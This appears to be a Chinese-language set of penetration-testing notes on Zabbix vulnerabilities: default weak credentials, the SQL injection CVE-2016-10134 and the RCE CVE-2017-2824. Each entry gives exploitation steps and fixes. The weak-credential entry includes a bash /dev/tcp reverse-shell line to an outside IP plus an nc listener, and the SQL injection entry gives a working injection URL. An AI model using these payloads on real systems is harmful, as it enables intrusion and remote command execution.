# zabbix
## zabbix弱口令漏洞
### 漏洞说明
运维人员在初次安装zabbix时候，zabbix默认的口令为Admin:zabbix，以及存在guest密码为空，没有进行更改和禁止guest用户，导致zabbix存在致命漏洞，容易遭受攻击。
### 影响范围
/
### 验证方法
pocsuite: `poc_zabbix_weakpass`
### 利用方法
```bash
Zabbix server可以远程在agent的机器上执行任意命令
建立监控项
命令调用：bash -i >& /dev/tcp/45.xx.xxx.x1/6666 0>&1
命令调用：nc -lvp 6666
```
### 修复方式
1. zabbix放置在内网，不要暴露外网
2. 修改默认的口令密码
3. 禁止guest用户

## zabbix SQL注入漏洞 CVE-2016-10134
### 漏洞说明

### 影响范围
- 2.2.x
- 3.3.0-3.03

### 验证方法
**手工验证**:通过jsrpc.php触发，且无需登录：`http://your-ip:yourport/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)`
**pocsuite**:
poc_zabbix_sqlinject.py

### 利用方法
1. 通过sql注入漏洞获取管理员session或密码登录管理员后台。
2. 在`http://youhost/zabbix.php?action=script.list&ddreset=1` 页面添加script
3. 新建反弹shell命令，保存
4. 首页主页邮件使用该脚本，触发反弹shell

### 修复方式
禁用guest账号
升级zabbix版本


## Zabbix Server Active Proxy Trappe RCE漏洞 CVE-2017-2824
### 漏洞描述
利用条件比较苛刻，首先需要能访问到Zabbix Server监听的10051端口，另外需要配置Proxy，以及相应的Action来自动添加Host，从而达到利用ip参数进行命令注入
### 影响范围
Zabbix 2.4.7 – 2.4.8r1
### 利用方法
详见cve-2017-2824